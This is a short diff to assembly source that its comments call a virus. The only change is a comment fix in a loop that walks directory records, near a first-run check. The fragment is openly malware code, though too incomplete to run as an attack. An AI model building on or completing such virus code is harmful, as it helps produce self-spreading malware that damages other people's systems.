@@ -319,7 +319,7 @@ v_start:
         .continue:
             pop rcx
             add cx, word [rcx + r15 + 416]                      ; adding directory record lenght to cx (lower rcx, for word)
-            cmp rcx, qword [r15 + 350]                          ; comparing rcx counter with r10 (directory records total size)
+            cmp rcx, qword [r15 + 350]                          ; comparing rcx counter with [r15 + 350] (directory records total size)
             jne file_loop                                       ; if counter is not the same, continue loop. Exit virus otherwise
 
     cmp byte [r15 + 3000], FIRST_RUN                            ; checking if custom control flag we set earlier indicates virus first execution
